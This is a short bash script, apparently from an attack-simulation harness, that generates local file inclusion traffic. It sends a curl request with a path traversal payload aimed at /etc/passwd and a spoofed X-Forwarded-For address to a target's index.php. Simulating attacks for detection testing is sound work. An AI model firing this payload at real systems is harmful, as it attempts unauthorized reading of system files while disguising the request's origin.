#!/bin/bash

set -eu

source /app/attacks/_generate_ip.sh

echo "[*] Simulating LFI..."

IP=$(generate_ip "${1:-}")

curl -s -H "X-Forwarded-For: $IP" "$TARGET/index.php?page=../../../../etc/passwd" > /dev/null 

echo "[*] Finished simulating LFI"